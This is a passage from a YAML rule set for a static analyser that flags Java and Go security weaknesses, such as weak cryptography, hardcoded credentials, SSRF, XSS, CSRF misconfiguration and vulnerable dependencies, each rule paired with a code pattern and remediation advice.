- OWASP-A02-2021
rule:
  kind: method_invocation
  pattern: Cipher.getInstance($ALG)
note: 'Use AES-256 with GCM mode instead of DES.

  Fix: Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");

  '
---
id: java-cwe-328-weak-hash-md5
language: java
severity: warning
message: 'CWE-328: Weak Cryptographic Hash (MD5) - MD5 is cryptographically broken
  for security purposes'
tags:
- security
- cryptography
- CWE-328
- OWASP-A02-2021
rule:
  kind: method_invocation
  pattern: MessageDigest.getInstance("MD5")
note: 'Use SHA-256 or SHA-3 for cryptographic hashing.

  '
---
id: java-cwe-328-weak-hash-sha1
language: java
severity: warning
message: 'CWE-328: Weak Cryptographic Hash (SHA-1) - SHA-1 is deprecated for cryptographic
  purposes'
tags:
- security
- cryptography
- CWE-328
- OWASP-A02-2021
rule:
  kind: method_invocation
  pattern: MessageDigest.getInstance("SHA-1")
note: 'Use SHA-256 or stronger for cryptographic operations.

  '
---
id: java-cwe-327-ecb-mode-encryption
language: java
severity: warning
message: 'CWE-327: ECB Mode Encryption - ECB mode reveals patterns in encrypted data'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02-2021
rule:
  kind: method_invocation
  pattern: Cipher.getInstance($ALG)
note: 'Use GCM or CBC mode instead of ECB.

  Fix: Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");

  '
---
id: java-cwe-329-static-hardcoded-iv
language: java
severity: warning
message: 'CWE-329: Static/Hardcoded IV - Using static or predictable IV defeats encryption
  security'
tags:
- security
- cryptography
- CWE-329
- OWASP-A02-2021
rule:
  kind: constructor_invocation
  pattern: new IvParameterSpec($IV)
note: 'Generate random IV for each encryption operation.

  Fix: SecureRandom random = new SecureRandom();

  byte[] iv = new byte[12]; random.nextBytes(iv);

  IvParameterSpec ivSpec = new IvParameterSpec(iv);

  '
---
id: java-cwe-330-insecure-rng
language: java
severity: warning
message: 'CWE-330: Insecure Random Number Generator - java.util.Random is not cryptographically
  secure'
tags:
- security
- cryptography
- CWE-330
- OWASP-A02-2021
rule:
  kind: constructor_invocation
  pattern: new Random()
note: 'Use SecureRandom for cryptographic operations.

  Fix: SecureRandom secureRandom = new SecureRandom();

  Or: SecureRandom sr = SecureRandom.getInstanceStrong();

  '
---
id: java-cwe-321-hardcoded-crypto-key
language: java
severity: error
message: 'CWE-321: Hardcoded Cryptographic Key - Cryptographic keys embedded in source
  code'
tags:
- security
- cryptography
- CWE-321
- OWASP-A02-2021
rule:
  kind: constructor_invocation
  pattern: new SecretKeySpec($KEY, $ALG)
note: 'Use key management service or secure key storage.

  Never embed keys in source code.

  Load keys from secure configuration at runtime.

  '
---
id: java-cwe-326-insufficient-key-size
language: java
severity: warning
message: 'CWE-326: Insufficient Key Size - Key sizes below recommended minimums'
tags:
- security
- cryptography
- CWE-326
- OWASP-A02-2021
rule:
  kind: method_invocation
  pattern: $KG.init($SIZE)
note: 'Use minimum key sizes: AES-256, RSA-2048, EC-256.

  Adjust minimum based on current cryptanalysis recommendations.

  '
---
id: java-cwe-326-insecure-tls-ssl
language: java
severity: warning
message: 'CWE-326: Insecure TLS/SSL Configuration - Using deprecated TLS versions
  or weak cipher suites'
tags:
- security
- cryptography
- CWE-326
- OWASP-A02-2021
rule:
  kind: method_invocation
  pattern: SSLContext.getInstance($PROTOCOL)
note: 'Use TLS 1.2 or 1.3 minimum.

  Fix: SSLContext ctx = SSLContext.getInstance("TLSv1.3");

  '
---
id: java-cwe-295-certificate-validation-disabled
language: java
severity: error
message: 'CWE-295: Certificate Validation Disabled - Trust manager that accepts all
  certificates'
tags:
- security
- cryptography
- CWE-295
- OWASP-A07-2021
rule:
  kind: method_invocation
  pattern: class $CLASS implements X509TrustManager
note: 'Implement proper certificate validation in X509TrustManager.

  Never accept all certificates in production.

  Use default trust manager when possible.

  '
---
id: java-cwe-297-hostname-verification-disabled
language: java
severity: error
message: 'CWE-297: Hostname Verification Disabled - Hostname verifier that accepts
  all hostnames'
tags:
- security
- cryptography
- CWE-297
- OWASP-A07-2021
rule:
  kind: lambda_expression
  pattern: ($H, $S) -> true
note: 'Implement proper hostname verification.

  Never return true for all hostnames in production.

  Use default hostname verifier when possible.

  '
---
id: java-cwe-798-hardcoded-password
language: java
severity: error
message: 'CWE-798: Hardcoded Password - Passwords embedded in source code'
tags:
- security
- auth
- CWE-798
- OWASP-A07-2021
rule:
  kind: variable_assignment
  pattern: $VAR = $LITERAL
note: 'Never embed passwords in source code.

  Load credentials from secure configuration sources.

  Variable names: password, passwd, pwd, secret, credential, apikey

  '
---
id: java-cwe-258-empty-password
language: java
severity: warning
message: 'CWE-258: Empty Password - Empty password strings in authentication'
tags:
- security
- auth
- CWE-258
- OWASP-A07-2021
rule:
  kind: method_invocation
  pattern: setPassword("")
note: 'Never allow empty passwords in authentication.

  Validate that passwords meet minimum requirements.

  '
---
id: java-cwe-256-insecure-password-storage
language: java
severity: warning
message: 'CWE-256: Insecure Password Storage - Storing passwords without proper hashing'
tags:
- security
- auth
- CWE-256
- OWASP-A02-2021
rule:
  kind: method_invocation
  pattern: $OBJ.setPassword($PLAIN)
note: 'Always hash passwords using BCrypt, Argon2, or PBKDF2.

  Fix: String hashedPassword = BCrypt.hashpw(plainPassword, BCrypt.gensalt(12));

  '
---
id: java-cwe-916-weak-password-hash
language: java
severity: warning
message: 'CWE-916: Weak Password Hashing - Using fast hashes instead of password-specific
  algorithms'
tags:
- security
- auth
- CWE-916
- OWASP-A02-2021
rule:
  kind: method_invocation
  pattern: MessageDigest.getInstance($ALG)
note: 'Use BCrypt, Argon2, or PBKDF2 for password hashing.

  Never use MD5, SHA-1, or SHA-256 for passwords.

  '
---
id: java-cwe-384-session-fixation
language: java
severity: warning
message: 'CWE-384: Session Fixation - Not regenerating session ID after authentication'
tags:
- security
- auth
- CWE-384
- OWASP-A07-2021
rule:
  kind: method_invocation
  pattern: $SESSION.setAttribute(...)
note: 'Always regenerate session ID after successful authentication.

  Fix: request.getSession().invalidate();

  HttpSession newSession = request.getSession(true);

  '
---
id: java-cwe-613-missing-session-timeout
language: java
severity: warning
message: 'CWE-613: Missing Session Timeout - Sessions without timeout allow indefinite
  access'
tags:
- security
- auth
- CWE-613
- OWASP-A07-2021
rule:
  kind: method_invocation
  pattern: $SESSION.setMaxInactiveInterval($TIMEOUT)
note: 'Set appropriate session timeout (typically 15-30 minutes).

  Configure in web.xml session-timeout element or programmatically.

  '
---
id: java-cwe-639-idor-insecure-direct-object-reference
language: java
severity: warning
message: 'CWE-639: Insecure Direct Object Reference - Using user-supplied IDs without
  authorization check'
tags:
- security
- access-control
- CWE-639
- OWASP-A01-2021
rule:
  kind: method_invocation
  pattern: $REPO.findById($ID)
note: 'Always verify user authorization before returning objects.

  Check that user can access the requested resource.

  Use role-based or attribute-based access control.

  '
---
id: java-cwe-862-missing-authorization
language: java
severity: warning
message: 'CWE-862: Missing Authorization Check - Endpoints without authorization annotations
  or checks'
tags:
- security
- access-control
- CWE-862
- OWASP-A01-2021
rule:
  kind: method_declaration
  pattern: '@RequestMapping($PATH)'
note: 'Add @PreAuthorize, @Secured, or @RolesAllowed to sensitive endpoints.

  Implement authorization checks for admin, delete, update operations.

  '
---
id: java-cwe-269-privilege-escalation
language: java
severity: warning
message: 'CWE-269: Privilege Escalation via Parameter Manipulation - Allowing role
  changes via request parameters'
tags:
- security
- access-control
- CWE-269
- OWASP-A01-2021
rule:
  kind: method_invocation
  pattern: $REPO.save($ENTITY)
note: 'Never allow users to set sensitive fields like role, admin, permissions directly.

  Sanitize entity fields before saving.

  Use DTOs that only include allowed user-settable fields.

  '
---
id: java-cwe-209-stack-trace-exposure
language: java
severity: warning
message: 'CWE-209: Stack Trace Exposure - Exposing stack traces to end users'
tags:
- security
- info-disclosure
- CWE-209
- OWASP-A04-2021
rule:
  kind: method_invocation
  pattern: $EX.printStackTrace()
note: 'Log stack traces internally; return generic error messages to users.

  Fix: logger.error("Error processing request", e);

  response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "An error occurred");

  '
---
id: java-cwe-532-sensitive-data-in-logs
language: java
severity: warning
message: 'CWE-532: Sensitive Data in Logs - Logging sensitive information like passwords
  or tokens'
tags:
- security
- info-disclosure
- CWE-532
- OWASP-A09-2021
rule:
  kind: method_invocation
  pattern: $LOGGER.info($MSG)
note: 'Never log passwords, tokens, API keys, credit cards, or SSNs.

  Use parameterized logging to avoid including sensitive variables.

  '
---
id: java-cwe-209-sensitive-data-exception-message
language: java
severity: warning
message: 'CWE-209: Sensitive Data in Exception Message - Including sensitive data
  in exception messages'
tags:
- security
- info-disclosure
- CWE-209
- OWASP-A04-2021
rule:
  kind: throw_statement
  pattern: throw new $EXCEPTION($MSG)
note: 'Never include sensitive data in exception messages.

  Use generic error messages; log details internally.

  '
---
id: java-cwe-113-http-response-splitting
language: java
severity: warning
message: 'CWE-113: HTTP Response Splitting - User input in HTTP headers allowing injection'
tags:
- security
- info-disclosure
- CWE-113
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: $RESPONSE.setHeader($NAME, $VALUE)
note: 'Sanitize header values to remove CRLF characters.

  Validate and encode user input before setting HTTP headers.

  '
---
id: java-cwe-918-ssrf-url
language: java
severity: warning
message: 'CWE-918: SSRF via URL - User-controlled URLs in server-side requests'
tags:
- security
- ssrf
- CWE-918
- OWASP-A10-2021
rule:
  kind: constructor_invocation
  pattern: new URL($URL)
note: 'Validate URL against whitelist of allowed hosts.

  Check protocol is HTTPS.

  Reject private IP addresses if not needed.

  Fix: if (!ALLOWED_HOSTS.contains(uri.getHost())) throw new SecurityException("Host
  not allowed");

  '
---
id: java-cwe-918-ssrf-resttemplate
language: java
severity: warning
message: 'CWE-918: SSRF via RestTemplate - RestTemplate with user-controlled URLs'
tags:
- security
- ssrf
- CWE-918
- OWASP-A10-2021
rule:
  kind: method_invocation
  pattern: $REST.getForObject($URL, ...)
note: 'Validate user-supplied URLs against whitelist before making requests.

  '
---
id: java-cwe-918-ssrf-webclient
language: java
severity: warning
message: 'CWE-918: SSRF via WebClient - WebClient with user-controlled URLs'
tags:
- security
- ssrf
- CWE-918
- OWASP-A10-2021
rule:
  kind: method_invocation
  pattern: WebClient.create($URL)
note: 'Validate user-supplied URLs against whitelist before making requests.

  '
---
id: java-cwe-918-ssrf-httpclient-java11
language: java
severity: warning
message: 'CWE-918: SSRF via HttpClient - HttpClient with user-controlled requests'
tags:
- security
- ssrf
- CWE-918
- OWASP-A10-2021
rule:
  kind: method_invocation
  pattern: HttpRequest.newBuilder().uri($URI)
note: 'Validate user-supplied URLs before creating HTTP requests.

  '
---
id: java-cwe-918-ssrf-apache-httpclient
language: java
severity: warning
message: 'CWE-918: SSRF via Apache HttpClient - Apache HttpClient with user-controlled
  URLs'
tags:
- security
- ssrf
- CWE-918
- OWASP-A10-2021
rule:
  kind: constructor_invocation
  pattern: new HttpGet($URL)
note: 'Validate user-supplied URLs against whitelist.

  '
---
id: java-cwe-601-open-redirect-sendredirect
language: java
severity: warning
message: 'CWE-601: Open Redirect via sendRedirect - Redirecting to user-controlled
  URLs'
tags:
- security
- open-redirect
- CWE-601
- OWASP-A01-2021
rule:
  kind: method_invocation
  pattern: $RESPONSE.sendRedirect($URL)
note: 'Validate redirect URLs to only allow relative paths or whitelisted hosts.

  Fix: if (url != null && url.startsWith("/") && !url.startsWith("//")) response.sendRedirect(url);

  '
---
id: java-cwe-601-open-redirect-spring
language: java
severity: warning
message: 'CWE-601: Open Redirect via Spring - Spring redirect with user-controlled
  URL'
tags:
- security
- open-redirect
- CWE-601
- OWASP-A01-2021
rule:
  kind: return_statement
  pattern: return "redirect:" + $URL
note: 'Validate redirect URLs before returning redirect view.

  Only allow relative paths or whitelisted hosts.

  '
---
id: java-cwe-79-xss-printwriter
language: java
severity: warning
message: 'CWE-79: Reflected XSS via PrintWriter - Writing user input directly to response'
tags:
- security
- xss
- CWE-79
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: $RESPONSE.getWriter().println($CONTENT)
note: 'HTML-encode all user input before writing to response.

  Fix: String safe = HtmlUtils.htmlEscape(userInput);

  '
---
id: java-cwe-79-xss-jsp-expression
language: java
severity: warning
message: 'CWE-79: XSS via JSP Expression - Unescaped output in JSP'
tags:
- security
- xss
- CWE-79
- OWASP-A03-2021
rule:
  kind: jsp_expression
  pattern: <%= $EXPR %>
note: 'Use fn:escapeXml() or <c:out> with escapeXml="true" (default).

  Never output unescaped user data in JSP.

  '
---
id: java-cwe-79-xss-thymeleaf
language: java
severity: warning
message: 'CWE-79: XSS in Thymeleaf - Unescaped output in Thymeleaf'
tags:
- security
- xss
- CWE-79
- OWASP-A03-2021
rule:
  kind: html_attribute
  pattern: th:utext="${$VAR}"
note: 'Use th:text (escaped) instead of th:utext (unescaped).

  Fix: <span th:text="${userInput}">...</span>

  '
---
id: java-cwe-489-debug-mode-enabled
language: java
severity: warning
message: 'CWE-489: Debug Mode Enabled in Production - Debug features enabled in production'
tags:
- security
- config
- CWE-489
- OWASP-A05-2021
rule:
  kind: method_invocation
  pattern: $OBJ.setDebug(true)
note: 'Disable debug mode in production configuration.

  Use environment-specific profiles to manage debug settings.

  '
---
id: java-cwe-942-cors-allow-all
language: java
severity: warning
message: 'CWE-942: CORS Misconfiguration (Allow All) - CORS allowing all origins'
tags:
- security
- config
- CWE-942
- OWASP-A05-2021
rule:
  kind: method_invocation
  pattern: setHeader("Access-Control-Allow-Origin", "*")
note: 'Specify allowed origins explicitly instead of "*".

  Use @CrossOrigin(origins = {"https://trusted-domain.com"}).

  '
---
id: java-cwe-1021-missing-security-headers
language: java
severity: warning
message: 'CWE-1021: Missing Security Headers - Missing security headers (CSP, X-Frame-Options,
  etc.)'
tags:
- security
- config
- CWE-1021
- OWASP-A05-2021
rule:
  kind: method_declaration
  pattern: '@GetMapping($PATH)'
note: 'Add security headers: X-Frame-Options, Content-Security-Policy, X-Content-Type-Options,
  Strict-Transport-Security.

  Use Spring Security header configuration or custom filter.

  '
---
id: java-cwe-200-exposed-actuator-endpoints
language: java
severity: warning
message: 'CWE-200: Exposed Actuator Endpoints - Spring Boot actuator endpoints exposed
  without authentication'
tags:
- security
- config
- CWE-200
- OWASP-A05-2021
rule:
  kind: property_assignment
  pattern: management.endpoints.web.exposure.include=*
note: 'Restrict actuator endpoint exposure to trusted IPs.

  Require authentication for sensitive endpoints.

  Fix: management.endpoints.web.exposure.include=health,metrics

  '
---
id: java-cwe-200-swagger-exposed-production
language: java
severity: warning
message: 'CWE-200: Swagger/OpenAPI Exposed in Production - API documentation exposed
  in production'
tags:
- security
- config
- CWE-200
- OWASP-A05-2021
rule:
  kind: class_declaration
  pattern: '@EnableSwagger2'
note: 'Disable Swagger/OpenAPI in production configuration.

  Use profile-specific configuration to enable only in dev/test.

  '
---
id: java-cwe-367-toctou-race-condition
language: java
severity: warning
message: 'CWE-367: Time-of-Check to Time-of-Use (TOCTOU) - Check and use of a resource
  not atomic'
tags:
- security
- race-condition
- CWE-367
- OWASP-A04-2021
rule:
  kind: if_statement
  pattern: if ($FILE.exists()) { ... $FILE ... }
note: 'Make check and action atomic using proper synchronization or atomic operations.

  Use try-with-resources for file operations.

  '
---
id: java-cwe-609-double-checked-locking
language: java
severity: warning
message: 'CWE-609: Double-Checked Locking Without Volatile - Broken double-checked
  locking pattern'
tags:
- security
- race-condition
- CWE-609
- OWASP-A04-2021
rule:
  kind: variable_declaration
  pattern: private static $TYPE $INSTANCE;
note: 'Declare instance variable as volatile in double-checked locking.

  Fix: private static volatile Singleton instance;

  '
---
id: java-cwe-362-unsynchronized-shared-state
language: java
severity: warning
message: 'CWE-362: Unsynchronized Shared State - Mutable shared state without synchronization'
tags:
- security
- race-condition
- CWE-362
- OWASP-A04-2021
rule:
  kind: method_invocation
  pattern: $FIELD++
note: 'Use atomic types (AtomicInteger) or synchronization for shared mutable state.

  Fix: private final AtomicInteger count = new AtomicInteger();

  '
---
id: java-cwe-1333-redos-regex-dos
language: java
severity: warning
message: 'CWE-1333: Regular Expression DoS (ReDoS) - Regex patterns vulnerable to
  catastrophic backtracking'
tags:
- security
- dos
- CWE-1333
- OWASP-A04-2021
rule:
  kind: method_invocation
  pattern: Pattern.compile($REGEX)
note: 'Avoid nested quantifiers like (a+)+, (.*)+ or (.*)*

  Use atomic groups (?>...) or possessive quantifiers.

  Test regex against malicious input.

  '
---
id: java-cwe-776-xml-bomb-billion-laughs
language: java
severity: warning
message: 'CWE-776: Billion Laughs Attack (XML Bomb) - XML parser vulnerable to entity
  expansion attacks'
tags:
- security
- dos
- CWE-776
- OWASP-A05-2021
rule:
  kind: method_invocation
  pattern: DocumentBuilderFactory.newInstance()
note: 'Disable DOCTYPE declarations and entity expansion.

  Use XXE prevention configuration.

  '
---
id: java-cwe-400-uncontrolled-resource-consumption
language: java
severity: warning
message: 'CWE-400: Uncontrolled Resource Consumption - No limits on resource allocation'
tags:
- security
- dos
- CWE-400
- OWASP-A04-2021
rule:
  kind: constructor_invocation
  pattern: new byte[$SIZE]
note: 'Validate request size limits before allocating arrays.

  Set maximum content length in servlet/spring configuration.

  Limit collection growth in loops.

  '
---
id: java-cwe-400-thread-pool-exhaustion
language: java
severity: warning
message: 'CWE-400: Thread Pool Exhaustion - Unbounded thread creation or blocking
  operations'
tags:
- security
- dos
- CWE-400
- OWASP-A04-2021
rule:
  kind: method_invocation
  pattern: Executors.newCachedThreadPool()
note: 'Use bounded thread pools with reasonable limits.

  Fix: Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());

  '
---
id: java-cwe-1395-vulnerable-dependency-log4j
language: java
severity: error
message: 'CWE-1395: Vulnerable Dependency (Log4j) - Using vulnerable Log4j versions
  (< 2.17.0)'
tags:
- security
- dependencies
- CWE-1395
- OWASP-A06-2021
rule:
  kind: dependency_declaration
  pattern: log4j-core < 2.17.0
note: 'Upgrade Log4j to version 2.17.0 or later.

  Check for CVE-2021-44228 (Log4Shell) and related vulnerabilities.

  '
---
id: java-cwe-1395-vulnerable-dependency-jackson
language: java
severity: warning
message: 'CWE-1395: Vulnerable Dependency (Jackson Databind) - Using vulnerable Jackson
  versions'
tags:
- security
- dependencies
- CWE-1395
- OWASP-A06-2021
rule:
  kind: dependency_declaration
  pattern: jackson-databind < 2.13.4.2
note: 'Upgrade Jackson to patched version.

  Avoid enableDefaultTyping() for deserialization.

  '
---
id: java-cwe-1395-vulnerable-dependency-spring
language: java
severity: warning
message: 'CWE-1395: Vulnerable Dependency (Spring Framework) - Using Spring versions
  with known RCE'
tags:
- security
- dependencies
- CWE-1395
- OWASP-A06-2021
rule:
  kind: dependency_declaration
  pattern: spring-core < 5.3.18
note: 'Upgrade Spring to patched version (5.3.18+ for 5.x series).

  '
---
id: java-cwe-73-arbitrary-file-write
language: java
severity: error
message: 'CWE-73: Arbitrary File Write - Writing to user-controlled file paths'
tags:
- security
- file-operations
- CWE-73
- OWASP-A01-2021
rule:
  kind: constructor_invocation
  pattern: new FileOutputStream($PATH)
note: 'Validate file paths against a base directory.

  Use sanitized filenames with whitelist of allowed extensions.

  '
---
id: java-cwe-73-arbitrary-file-read
language: java
severity: warning
message: 'CWE-73: Arbitrary File Read - Reading from user-controlled file paths'
tags:
- security
- file-operations
- CWE-73
- OWASP-A01-2021
rule:
  kind: constructor_invocation
  pattern: new FileInputStream($PATH)
note: 'Validate file paths against a base directory.

  Ensure user has permission to access the file.

  '
---
id: java-cwe-73-arbitrary-file-delete
language: java
severity: warning
message: 'CWE-73: Arbitrary File Delete - Deleting user-controlled files'
tags:
- security
- file-operations
- CWE-73
- OWASP-A01-2021
rule:
  kind: method_invocation
  pattern: $FILE.delete()
note: 'Validate file paths carefully before deletion.

  Require user authorization for delete operations.

  '
---
id: java-cwe-434-unsafe-file-upload
language: java
severity: warning
message: 'CWE-434: Unsafe File Upload - File uploads without proper validation'
tags:
- security
- file-operations
- CWE-434
- OWASP-A04-2021
rule:
  kind: method_invocation
  pattern: $FILE.transferTo($DEST)
note: 'Validate file extension against whitelist.

  Validate MIME type (not just extension).

  Sanitize filename and use UUID for storage.

  Check file size limits.

  Fix: Use UUID filename, validate extension, scan for malware if applicable.

  '
---
id: java-cwe-377-temporary-file-security
language: java
severity: warning
message: 'CWE-377: Temporary File Security - Insecure temporary file creation'
tags:
- security
- file-operations
- CWE-377
- OWASP-A01-2021
rule:
  kind: method_invocation
  pattern: File.createTempFile($PREFIX, $SUFFIX)
note: 'Use Files.createTempFile with proper permissions.

  Fix: Path tempFile = Files.createTempFile("prefix", ".tmp",

  PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString("rw-------")));

  '
---
id: java-cwe-117-log-injection
language: java
severity: warning
message: 'CWE-117: Log Injection - User input in logs allowing log forging'
tags:
- security
- logging
- CWE-117
- OWASP-A09-2021
rule:
  kind: method_invocation
  pattern: $LOGGER.info($MSG)
note: 'Remove or sanitize CRLF characters from user input before logging.

  Use parameterized logging to avoid string concatenation.

  Fix: logger.info("User {} logged in", sanitized);

  '
---
id: java-cwe-778-missing-audit-logging
language: java
severity: warning
message: 'CWE-778: Missing Audit Logging - Security-sensitive operations without audit
  logging'
tags:
- security
- logging
- CWE-778
- OWASP-A09-2021
rule:
  kind: method_declaration
  pattern: public void delete*()
note: 'Log all security-sensitive operations: user creation/deletion, role changes,
  permission grants.

  Include user identity, timestamp, and what was changed.

  '
---
id: java-cwe-306-spring-security-disabled
language: java
severity: error
message: 'CWE-306: Spring Security Disabled - Spring Security configuration disabled'
tags:
- security
- spring-security
- CWE-306
- OWASP-A07-2021
rule:
  kind: method_invocation
  pattern: authorizeRequests().anyRequest().permitAll()
note: 'Always require authentication for sensitive endpoints.

  Use @PreAuthorize, @Secured, or role-based authorization.

  '
---
id: java-cwe-352-csrf-protection-disabled
language: java
severity: warning
message: 'CWE-352: CSRF Protection Disabled - CSRF protection disabled in Spring Security'
tags:
- security
- spring-security
- CWE-352
- OWASP-A05-2021
rule:
  kind: method_invocation
  pattern: $HTTP.csrf().disable()
note: 'Keep CSRF protection enabled in Spring Security.

  Never disable CSRF for stateful applications.

  '
---
id: java-cwe-306-unsafe-auth-entry-point
language: java
severity: warning
message: 'CWE-306: Unsafe Authentication Entry Point - Authentication failure revealing
  user existence'
tags:
- security
- spring-security
- CWE-306
- OWASP-A07-2021
rule:
  kind: throw_statement
  pattern: throw new UsernameNotFoundException($MSG)
note: 'Use same error message for user-not-found and bad-password cases.

  Fix: throw new BadCredentialsException("Invalid credentials");

  '
---
id: java-cwe-316-sensitive-data-in-string
language: java
severity: warning
message: 'CWE-316: Sensitive Data in String - Passwords/keys stored in immutable String
  objects'
tags:
- security
- memory-safety
- CWE-316
- OWASP-A02-2021
rule:
  kind: variable_declaration
  pattern: String $VAR = ...
note: 'Use char[] instead of String for sensitive data.

  Clear sensitive data with Arrays.fill(password, ''\\0'').

  Fix: char[] password = getPassword();

  '
---
id: java-cwe-111-unsafe-native-method
language: java
severity: warning
message: 'CWE-111: Unsafe Native Method - Native methods with user-controlled input'
tags:
- security
- memory-safety
- CWE-111
- OWASP-A04-2021
rule:
  kind: method_declaration
  pattern: public native void $METHOD($PARAMS)
note: 'Carefully validate all input to native methods.

  Never allow user-controlled library names in System.loadLibrary().

  '
---
id: java-cwe-915-mass-assignment-vulnerability
language: java
severity: warning
message: 'CWE-915: Mass Assignment Vulnerability - Binding all request parameters
  to model objects'
tags:
- security
- business-logic
- CWE-915
- OWASP-A04-2021
rule:
  kind: method_parameter
  pattern: '@ModelAttribute $TYPE $VAR'
note: 'Use DTOs with only allowed user-settable fields.

  Mark sensitive fields with @JsonIgnore.

  Manually map request to entity fields.

  '
---
id: java-cwe-799-insufficient-anti-automation
language: java
severity: warning
message: 'CWE-799: Insufficient Anti-Automation - Login/registration without rate
  limiting'
tags:
- security
- business-logic
- CWE-799
- OWASP-A07-2021
rule:
  kind: method_declaration
  pattern: '@PostMapping("/login")'
note: 'Implement rate limiting on authentication endpoints.

  Use @RateLimiter annotation or implement custom rate limiting logic.

  '
---
id: java-cwe-190-numeric-overflow-financial
language: java
severity: warning
message: 'CWE-190: Numeric Overflow in Financial Calculation - Integer arithmetic
  in financial calculations'
tags:
- security
- business-logic
- CWE-190
- OWASP-A04-2021
rule:
  kind: binary_operation
  pattern: $VAR = $A * $B
note: 'Use BigDecimal for financial calculations.

  Or use Math.multiplyExact() for overflow checking.

  Fix: BigDecimal total = quantity.multiply(price);

  '
---
id: java-cwe-499-serializable-with-sensitive
language: java
severity: warning
message: 'CWE-499: Serializable with Sensitive Fields - Serializable classes with
  unprotected sensitive fields'
tags:
- security
- serialization
- CWE-499
- OWASP-A04-2021
rule:
  kind: field_declaration
  pattern: private $TYPE $FIELD;
note: 'Mark sensitive fields as transient: private transient String password;

  Sensitive field names: password, secret, key, ssn, creditCard

  '
---
id: java-cwe-502-missing-serialization-proxy
language: java
severity: info
message: 'CWE-502: Missing Serialization Proxy Pattern - Complex serializable classes
  without serialization proxy'
tags:
- security
- serialization
- CWE-502
- OWASP-A08-2021
rule:
  kind: method_declaration
  pattern: readObject(ObjectInputStream)
note: 'Consider implementing writeReplace() and readResolve() for security.

  Validate input in readObject() methods.

  '
---
id: java-cwe-470-reflection-privilege-escalation
language: java
severity: warning
message: 'CWE-470: Reflection Privilege Escalation - User-controlled class instantiation
  via reflection'
tags:
- security
- reflection
- CWE-470
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: Class.forName($CLASSNAME)
note: 'Maintain whitelist of allowed classes.

  Validate class names before instantiation.

  '
---
id: java-cwe-470-setaccessible-security-bypass
language: java
severity: warning
message: 'CWE-470: setAccessible Security Bypass - Bypassing access control via setAccessible'
tags:
- security
- reflection
- CWE-470
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: $MEMBER.setAccessible(true)
note: 'Avoid using setAccessible(true) unless absolutely necessary.

  In production code, consider using Java modules or sealed classes.

  '
---
id: java-cwe-470-unsafe-proxy-creation
language: java
severity: warning
message: 'CWE-470: Unsafe Proxy Creation - Creating proxies for user-specified interfaces'
tags:
- security
- reflection
- CWE-470
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: Proxy.newProxyInstance($LOADER, $INTERFACES, $HANDLER)
note: 'Validate interface classes before creating proxies.

  Use whitelist of allowed interfaces.

  '
---
id: java-cwe-502-unsafe-deserialization-gadgets
language: java
severity: error
message: 'CWE-502: Unsafe Deserialization Gadgets - Presence of known gadget chain
  classes'
tags:
- security
- gadget-chain
- CWE-502
- OWASP-A08-2021
rule:
  kind: dependency_declaration
  pattern: commons-collections <= 3.2.1
note: 'Update vulnerable dependencies: commons-collections, commons-beanutils, spring-core.

  If ObjectInputStream is used, ensure ObjectInputFilter is configured.

  '
---
id: java-cwe-347-jwt-none-algorithm
language: java
severity: error
message: 'CWE-347: JWT None Algorithm Attack - JWT verification accepting ''none''
  algorithm'
tags:
- security
- jwt
- CWE-347
- OWASP-A02-2021
rule:
  kind: method_invocation
  pattern: Jwts.parser().parseClaimsJws($TOKEN)
note: 'Explicitly require specific algorithm in JWT parser.

  Fix: Jwts.parserBuilder().setSigningKey(key).build().parseClaimsJws(token);

  '
---
id: java-cwe-200-graphql-introspection-enabled
language: java
severity: warning
message: 'CWE-200: GraphQL Introspection Enabled - GraphQL introspection queries enabled
  in production'
tags:
- security
- graphql
- CWE-200
- OWASP-A05-2021
rule:
  kind: method_invocation
  pattern: GraphQL.newGraphQL($SCHEMA).build()
note: 'Disable GraphQL introspection in production.

  Use profile-specific configuration to enable only in development.

  '
---
id: java-cwe-943-mongodb-injection
language: java
severity: warning
message: 'CWE-943: MongoDB Injection - NoSQL injection in MongoDB queries'
tags:
- security
- nosql-injection
- CWE-943
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: Document.parse($QUERY)
note: 'Use Document API with typed parameters.

  Never parse user input as MongoDB query.

  Fix: Document query = new Document("username", username);

  '
---
id: java-cwe-597-insecure-string-comparison
language: java
severity: warning
message: 'CWE-597: Insecure Object Comparison - Using == for security-sensitive comparisons'
tags:
- security
- comparison
- CWE-597
- OWASP-A04-2021
rule:
  kind: binary_operation
  pattern: $A == $B
note: 'Use .equals() for string comparison, not ==.

  Use MessageDigest.isEqual() for security-sensitive comparisons.

  Fix: if ("ADMIN".equals(userRole)) { ... }

  '
---
id: go-cwe-330-weak-random-number-generator
language: go
severity: critical
message: 'CWE-330: Use of Insufficiently Random Values - math/rand is not cryptographically
  secure'
tags:
- security
- cryptography
- CWE-330
- OWASP-Cryptography
rule:
  kind: import
  pattern: import "math/rand"
note: 'math/rand uses a deterministic PRNG unsuitable for security-sensitive operations.
  Use crypto/rand instead.

  Replace rand.Intn(), rand.Read(), rand.Int63(), rand.Float64() with crypto/rand
  equivalents.

  '
---
id: go-cwe-798-hardcoded-cryptographic-keys
language: go
severity: critical
message: 'CWE-798: Use of Hard-coded Credentials - cryptographic keys hardcoded in
  source'
tags:
- security
- cryptography
- CWE-798
- OWASP-Credentials
rule:
  kind: call
  pattern: aes.NewCipher([]byte("..."))
note: 'Hardcoded keys can be extracted from binaries and cannot be rotated. Load keys
  from environment variables

  or secure storage systems instead.

  '
---
id: go-cwe-329-weak-iv
language: go
severity: high
message: 'CWE-329: Not Using an Unpredictable IV - static or zero-initialized IV in
  encryption'
tags:
- security
- cryptography
- CWE-329
- CWE-327
rule:
  kind: assignment
  pattern: iv := make([]byte, aes.BlockSize)
note: 'ECB mode and static IVs enable replay attacks and pattern detection. Always
  use unique random IVs:

  Use io.ReadFull(rand.Reader, iv) to generate random IVs for CBC, CFB modes.

  '
---
id: go-cwe-328-deprecated-hash-functions
language: go
severity: high
message: 'CWE-328: Reversible One-Way Hash - MD5 or SHA1 used for cryptographic purposes'
tags:
- security
